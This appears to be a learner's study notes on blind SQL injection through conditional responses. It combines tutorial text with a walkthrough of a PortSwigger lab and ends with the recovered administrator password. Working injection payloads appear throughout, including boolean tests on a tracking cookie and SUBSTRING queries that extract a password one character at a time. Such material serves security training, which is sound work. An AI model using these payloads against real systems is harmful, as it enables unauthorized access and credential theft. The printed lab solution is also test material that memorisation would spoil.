
## Blind SQL injection

In this section, we describe techniques for finding and exploiting blind SQL injection vulnerabilities.


## What is blind SQL injection?

Blind SQL injection occurs when an application is vulnerable to SQL injection, but its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors.

Many techniques such as `UNION` attacks are not effective with blind SQL injection vulnerabilities. This is because they rely on being able to see the results of the injected query within the application's responses. It is still possible to exploit blind SQL injection to access unauthorized data, but different techniques must be used.


## Exploiting blind SQL injection by triggering conditional responses

Consider an application that uses tracking cookies to gather analytics about usage. Requests to the application include a cookie header like this:

`Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4`

When a request containing a `TrackingId` cookie is processed, the application uses a SQL query to determine whether this is a known user:

`SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'`

This query is vulnerable to SQL injection, but the results from the query are not returned to the user. However, the application does behave differently depending on whether the query returns any data. If you submit a recognized `TrackingId`, the query returns data and you receive a "Welcome back" message in the response.

This behavior is enough to be able to exploit the blind SQL injection vulnerability. You can retrieve information by triggering different responses conditionally, depending on an injected condition.


## Exploiting blind SQL injection by triggering conditional responses - Continued

To understand how this exploit works, suppose that two requests are sent containing the following `TrackingId` cookie values in turn:

`…xyz' AND '1'='1 …xyz' AND '1'='2`

- The first of these values causes the query to return results, because the injected `AND '1'='1` condition is true. As a result, the "Welcome back" message is displayed.
- The second value causes the query to not return any results, because the injected condition is false. The "Welcome back" message is not displayed.

This allows us to determine the answer to any single injected condition, and extract data one piece at a time.

## Exploiting blind SQL injection by triggering conditional responses - Continued

For example, suppose there is a table called `Users` with the columns `Username` and `Password`, and a user called `Administrator`. You can determine the password for this user by sending a series of inputs to test the password one character at a time.

To do this, start with the following input:

`xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm`

This returns the "Welcome back" message, indicating that the injected condition is true, and so the first character of the password is greater than `m`.

Next, we send the following input:

`xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't`

This does not return the "Welcome back" message, indicating that the injected condition is false, and so the first character of the password is not greater than `t`.

Eventually, we send the following input, which returns the "Welcome back" message, thereby confirming that the first character of the password is `s`:

`xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's`

We can continue this process to systematically determine the full password for the `Administrator` user.

#### Note

The `SUBSTRING` function is called `SUBSTR` on some types of database. For more details, see the [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).



---
---

## Lab: Blind SQL injection with conditional responses

PRACTITIONER

LABNot solved

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and no error messages are displayed. But the application includes a "Welcome back" message in the page if the query returns any rows.

The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.

To solve the lab, log in as the `administrator` user.


----
----

## Conclusion


video: https://youtu.be/LBG_n9fr8sM





guessed sql query
->> select trackind_id from tracking_table where tracking_id = '2QnkloiTuma4Usgp'

# Checking if blind sql exist or not.

we should get different response for the following query

->> select trackind_id from tracking_table where tracking_id = '2QnkloiTuma4Usgp 'and 1=1 --'
Response = welcome back

->> select trackind_id from tracking_table where tracking_id = '2QnkloiTuma4Usgp 'and 1=2 --'
Response = No welcome back 

`which means the web app is vulnreable to blind sql `


# checking if users table exist or not.


->> select trackind_id from tracking_table where tracking_id = '2QnkloiTuma4Usgp 'and (select 'x' from users limit 1) = 'x' --
Response = welcome back

`which means users table is present`


# checking if username `administrator` exist in users table

 ->> select trackind_id from tracking_table where tracking_id = '2QnkloiTuma4Usgp 'and (select username from users where username = 'administrator') = 'administrator' --

Response = welcome back

`which means table users contains username administrator`


# finding length of the password

 ->> select trackind_id from tracking_table where tracking_id = '2QnkloiTuma4Usgp'and (select username from users where username = 'administrator' and length(Password) >0)='administrator' -- '

`we loop this until the response is different`

using burpsuite intruder we found the lenght of password to be=  20

# finding the password


->> select trackind_id from tracking_table where tracking_id = '2QnkloiTuma4Usgp'and (select substring(password,1,1) from users where username ='administrator') = 'a' --'

`no match, now using burp we loop this process to find the correct password`

using burp

`password was` : 

123456789 10 11 12 13 14 15 16 17 18 19 20
cvxpii3b6k10d5j3bjoh


cvxpii3b6k10d5j3bjoh
























